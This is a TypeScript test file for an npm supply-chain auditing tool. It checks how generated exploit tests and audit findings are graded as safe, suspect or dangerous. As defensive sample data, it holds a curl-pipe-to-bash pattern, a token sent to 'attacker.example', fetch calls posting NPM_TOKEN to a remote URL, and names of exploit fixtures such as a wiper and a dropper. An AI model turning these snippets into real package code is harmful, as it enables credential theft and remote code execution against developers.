import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import type { AuditReport, Proof } from "./models.js";
import {
  assessAuditReport,
  assessFindingQuality,
  assessGeneratedTestProofQuality,
  classifyAuditReport,
} from "./proof-quality.js";

function proof(overrides: Partial<Proof> = {}): Proof {
  return {
    capability: "CREDENTIAL_THEFT",
    attackPathway: "",
    confidence: "CONFIRMED",
    fileLine: "index.js:1",
    problem: "reads and exfiltrates a canary",
    evidence: "generated test",
    kind: "TEST_CONFIRMED",
    contentHash: null,
    reproducible: true,
    reproductionCmd: null,
    testFile: "/tmp/finding.test.ts",
    testHash: "abc",
    testCode: null,
    verifyError: null,
    reasoningHash: null,
    teeAttestationId: null,
    ...overrides,
  };
}

function report(overrides: Partial<AuditReport> = {}): AuditReport {
  return {
    verdict: "DANGEROUS",
    capabilities: [],
    proofs: [],
    triage: null,
    findings: [],
    trace: [],
    runtimeEvidence: null,
    ...overrides,
  };
}

describe("assessGeneratedTestProofQuality", () => {
  it("accepts an unconditional canary crossing a captured network sink", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("exfiltrates planted credentials", async () => {
        let exfilBody = "";
        server.use(http.post("*", async ({ request }) => {
          exfilBody = await request.text();
          return HttpResponse.text("ok");
        }));
        await runPackage("package", "postinstall.js");
        expect(exfilBody).toContain("NPMGUARD_CANARY");
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(true);
    expect(result.signals).toContain("canary-crossed-sink");
  });

  it("rejects a negative test that passes because nothing happened", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("does not exfiltrate credentials", async () => {
        let exfilBody = null;
        await runPackage("package", "index.js");
        expect(exfilBody).toBeNull();
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("absence");
  });

  it("rejects a self-satisfying environment assertion", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("exfiltrates credentials", async () => {
        await runPackage("package", "index.js");
        const envRead = Object.keys(process.env).filter((k) => k.includes("NPM_TOKEN"));
        expect(envRead.length > 0).toBe(true);
      });
    `, "DOM_INJECT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("environment itself");
  });

  it("rejects attacker-controlled configuration supplied by the test", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runPackage } = require("../harness/sandbox-runner");
      it("sends a request", async () => {
        const { Client } = await runPackage("package", "index.js");
        const client = new Client({ apiBaseUrl: "https://attacker.example/" });
        await client.send(process.env.NPM_TOKEN);
        expect(body).toContain("NPMGUARD_CANARY");
      });
    `, "CREDENTIAL_THEFT");

    expect(result.accepted).toBe(false);
    expect(result.reason).toContain("attacker-controlled input");
  });

  it("rejects a normal process API call without a dangerous outcome", () => {
    const result = assessGeneratedTestProofQuality(`
      const cp = require("child_process");
      const { runPackage } = require("../harness/sandbox-runner");
      it("starts its documented watchdog", async () => {
        const spy = vi.spyOn(cp, "spawn");
        await runPackage("package", "watchdog.js");
        expect(spy).toHaveBeenCalled();
      });
    `, "PROCESS_SPAWN");

    expect(result.accepted).toBe(false);
  });

  it("accepts a lifecycle payload that produces a shell download-and-execute chain", () => {
    const result = assessGeneratedTestProofQuality(`
      const fs = require("fs");
      const { runPackage } = require("../harness/sandbox-runner");
      it("downloads and executes a payload during install", async () => {
        await runPackage("package", "postinstall.js");
        const spawnLog = fs.readFileSync("/workspace/spawn-log.txt", "utf8");
        expect(spawnLog).toMatch(/curl .* | bash/);
      });
    `, "LIFECYCLE_HOOK");

    expect(result.accepted).toBe(true);
    expect(result.signals).toContain("dangerous-process-chain");
  });

  it("accepts a reproducible DoS only when timeout and impact are both asserted", () => {
    const result = assessGeneratedTestProofQuality(`
      const { runInChildProcess } = require("../harness/child-process-runner");
      it("loops and floods stdout", async () => {
        const result = await runInChildProcess("package", "index.js", { timeout: 1000 });
        expect(result.timedOut).toBe(true);
        expect(result.stdout.length).toBeGreaterThan(1024);
      });
    `, "DOS_LOOP");

    expect(result.accepted).toBe(true);
  });

  it("accepts every malicious harness reference used by test generation", () => {
    const references: Record<string, string> = {
      "build-plugin-exfil": "BUILD_PLUGIN_EXFIL",
      "clipboard-hijack": "CLIPBOARD_HIJACK",
      "dns-exfil": "DNS_EXFIL",
      "dom-inject": "DOM_INJECT",
      "dos-loop": "DOS_LOOP",
      "encrypted-payload": "ENCRYPTED_PAYLOAD",
      "env-exfil": "CREDENTIAL_THEFT",
      "filesystem-wiper": "FILESYSTEM",
      "lifecycle-hook": "LIFECYCLE_HOOK",
      "obfuscated-dropper": "OBFUSCATION",
      "telemetry-rat": "TELEMETRY_RAT",
    };

    for (const [fixture, capability] of Object.entries(references)) {
      const code = readFileSync(
        resolve(import.meta.dirname, `../../sandbox/exploits/${fixture}.test.js`),
        "utf8",
      );
      const assessment = assessGeneratedTestProofQuality(code, capability);
      expect(
        assessment.accepted,
        `${fixture}: ${assessment.reason}`,
      ).toBe(true);
    }
  });
});

describe("classifyAuditReport", () => {
  it("marks a completed legacy report SAFE when no attack path survives review", () => {
    expect(classifyAuditReport(report({
      findings: [{
        capability: "NETWORK",
        confidence: "LIKELY",
        fileLine: "index.js:1",
        problem: "may send data",
        evidence: "static signal",
        reproductionStrategy: "",
      }],
    }))).toBe("SAFE");
  });

  it("marks a completed report SAFE when its passing test only proves absence", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        testCode: `
          const { runPackage } = require("../harness/sandbox-runner");
          it("does not steal credentials", async () => {
            await runPackage("package", "index.js");
            expect(exfilBody).toBeNull();
          });
        `,
      })],
    }))).toBe("SAFE");
  });

  it("keeps a high-quality confirmed proof DANGEROUS", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        testCode: `
          const { runPackage } = require("../harness/sandbox-runner");
          it("exfiltrates credentials", async () => {
            await runPackage("package", "postinstall.js");
            expect(exfilBody).toContain("NPMGUARD_CANARY");
          });
        `,
      })],
    }))).toBe("DANGEROUS");
  });

  it("keeps deterministic inventory dealbreakers DANGEROUS", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        capability: null,
        kind: "STRUCTURAL",
        evidence: "Dealbreaker: shell-pipe",
        testCode: null,
        testFile: null,
      })],
    }))).toBe("DANGEROUS");
  });

  it("marks legacy missing-install-script false positives SAFE", () => {
    expect(classifyAuditReport(report({
      proofs: [proof({
        capability: null,
        kind: "STRUCTURAL",
        evidence: "Dealbreaker: missing-install-script",
        problem: "Install script references 'install/check' but file not found in package",
        testCode: null,
        testFile: null,
      })],
    }))).toBe("SAFE");
  });

  it("keeps a concrete but unverified source-to-impact path SUSPECT", () => {
    expect(classifyAuditReport(report({
      findings: [{
        capability: "CREDENTIAL_THEFT",
        confidence: "LIKELY",
        fileLine: "postinstall.js:4-8",
        problem: "The install hook sends process.env.NPM_TOKEN to a remote endpoint.",
        evidence: "fetch(remoteUrl, { body: process.env.NPM_TOKEN })",
        reproductionStrategy: "Plant a canary token and intercept the outbound request.",
      }],
    }))).toBe("SUSPECT");
  });
});

describe("assessFindingQuality", () => {
  it("rejects findings that explicitly describe normal package behavior", () => {
    const assessment = assessFindingQuality({
      capability: "PROCESS_SPAWN",
      confidence: "CONFIRMED",
      fileLine: "lib/index.js:12",
      problem: "Accessing process.versions.node is a normal compatibility check.",
      evidence: "This is not inherently malicious and no suspicious behavior was identified.",
      reproductionStrategy: "",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("benign");
  });

  it("rejects normal localStorage and telemetry capabilities without an attack path", () => {
    const assessment = assessFindingQuality({
      capability: "ENV_VARS",
      confidence: "CONFIRMED",
      fileLine: "sdk.js:20",
      problem: "SDK version stored in local storage",
      evidence: "versionStorage.setItem('VERSION', LIB_VERSION)",
      reproductionStrategy: "Initialize the SDK and inspect localStorage.",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("source-to-impact");
  });

  it("rejects normal proxy authentication as credential theft", () => {
    const assessment = assessFindingQuality({
      capability: "CREDENTIAL_THEFT",
      confidence: "CONFIRMED",
      fileLine: "dist/proxy.cjs:1",
      problem: "The proxy client constructs a Proxy-Authorization header.",
      evidence: "Username and password are read from the configured proxy URL.",
      reproductionStrategy: "Configure an authenticated proxy and inspect the request.",
    });

    expect(assessment.accepted).toBe(false);
  });

  it("rejects an impact that is inconsistent with the reported capability", () => {
    const assessment = assessFindingQuality({
      capability: "ENV_VARS",
      confidence: "LIKELY",
      fileLine: "worker.js:10",
      problem: "A remote payload is downloaded and executed.",
      evidence: "fetch(url).then(execute)",
      reproductionStrategy: "",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("source-to-impact");
  });

  it("rejects meta-analysis that merely repeats a triage allegation", () => {
    const assessment = assessFindingQuality({
      capability: "CREDENTIAL_THEFT",
      confidence: "LIKELY",
      fileLine: "dist/bundle.js:1",
      problem: "Model summary describes credential theft or secret harvesting.",
      evidence: "Triage emitted this critical hypothesis. Static signal alone is strong enough to flag.",
      reproductionStrategy: "",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("metadata");
  });

  it("rejects dangerous-looking helpers that only exist in package tests", () => {
    const assessment = assessFindingQuality({
      capability: "WORM_PROPAGATION",
      confidence: "LIKELY",
      fileLine: "src/integration_tests/loadBundleForTest.js:5",
      problem: "The helper downloads and executes a bundle.",
      evidence: "download(path).then(execute)",
      reproductionStrategy: "",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("tests or fixtures");
  });

  it("rejects a reproducer that asks the caller to supply the malicious URL", () => {
    const assessment = assessFindingQuality({
      capability: "PROCESS_SPAWN",
      confidence: "LIKELY",
      fileLine: "worker.js:10",
      problem: "The worker downloads and executes an application script.",
      evidence: "fetch(message.url).then(execute)",
      reproductionStrategy:
        "Send a message with a malicious URL pointing to attacker-controlled code.",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("caller");
  });

  it("rejects hypothetical risk that requires an external source to be compromised first", () => {
    const assessment = assessFindingQuality({
      capability: "DOM_INJECT",
      confidence: "CONFIRMED",
      fileLine: "loader.js:20",
      problem:
        "The component appends a script element. If the script source is compromised or controlled by an attacker, code could be injected.",
      evidence: "document.head.appendChild(script)",
      reproductionStrategy: "Observe the dynamic script loader.",
    });

    expect(assessment.accepted).toBe(false);
    expect(assessment.reason).toContain("external service");
  });

  it("rejects generic eval usage without a demonstrated untrusted source-to-sink flow", () => {
    const assessment = assessFindingQuality({
      capability: "PROCESS_SPAWN",
      confidence: "SUSPECTED",
      fileLine: "dist/babel.cjs:1",
      problem:
        "The file contains eval calls which could facilitate arbitrary code execution or loading of untrusted code.",
      evidence: "eval, require",
      reproductionStrategy: "",
    });

    expect(assessment.accepted).toBe(false);
  });

  it("accepts an unverified credential flow only when a source and sink are identified", () => {
    const assessment = assessFindingQuality({
      capability: "CREDENTIAL_THEFT",
      confidence: "LIKELY",
      fileLine: "postinstall.js:4-8",
      problem: "The install hook exfiltrates an npm token.",
      evidence: "fetch(remoteUrl, { method: 'POST', body: process.env.NPM_TOKEN })",
      reproductionStrategy: "Intercept the network request.",
    });

    expect(assessment.accepted).toBe(true);
    expect(assessment.signals).toContain("secret-to-outbound-sink");
  });

  it("accepts a concrete untrusted-input code execution path", () => {
    const assessment = assessFindingQuality({
      capability: "PROCESS_SPAWN",
      confidence: "LIKELY",
      fileLine: "index.js:20",
      problem: "Attacker-controlled package metadata reaches child_process.exec.",
      evidence: "exec(packageJson.scripts.injected)",
      reproductionStrategy: "Use untrusted metadata and capture the spawned command.",
    });

    expect(assessment.accepted).toBe(true);
    expect(assessment.signals).toContain("untrusted-code-execution");
  });
});

describe("assessAuditReport", () => {
  it("provides a normalized, concrete DANGEROUS justification", () => {
    const assessment = assessAuditReport(report({
      proofs: [proof({
        capability: "CREDENTIAL_THEFT",
        fileLine: "postinstall.js:4-8",
        evidence: "generated test captured the planted token",
        testCode: `
          const { runPackage } = require("../harness/sandbox-runner");
          it("exfiltrates credentials", async () => {
            await runPackage("package", "postinstall.js");
            expect(exfilBody).toContain("NPMGUARD_CANARY");
          });
        `,
      })],
    }));

    expect(assessment.classification).toBe("DANGEROUS");
    expect(assessment.summary).toContain("Sandbox exploit reproduced");
    expect(assessment.summary).toContain("planted canary");
    expect(assessment.evidence).toEqual([
      expect.objectContaining({
        source: "sandbox",
        capability: "CREDENTIAL_THEFT",
        fileLine: "postinstall.js:4-8",
      }),
    ]);
  });

  it("explains why rejected weak legacy signals result in SAFE", () => {
    const assessment = assessAuditReport(report({
      findings: [{
        capability: "ENV_VARS",
        confidence: "CONFIRMED",
        fileLine: "sdk.js:20",
        problem: "SDK version stored in local storage",
        evidence: "Normal SDK initialization.",
        reproductionStrategy: "",
      }],
    }));

    expect(assessment.classification).toBe("SAFE");
    expect(assessment.summary).toContain("Audit completed");
    expect(assessment.summary).toContain("signals were rejected");
    expect(assessment.rejectedSignalCount).toBe(1);
  });
});
